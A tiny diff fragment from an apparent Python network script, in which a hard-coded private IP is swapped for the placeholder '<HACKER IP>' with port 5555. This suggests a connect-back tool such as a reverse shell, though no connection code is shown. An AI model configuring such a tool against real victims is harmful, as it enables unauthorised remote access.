@@ -5,7 +5,7 @@ import json
 import signal
 import os
 
-ip = '192.168.88.13'
+ip = '<HACKER IP>'
 port = 5555
 
 sigint = False
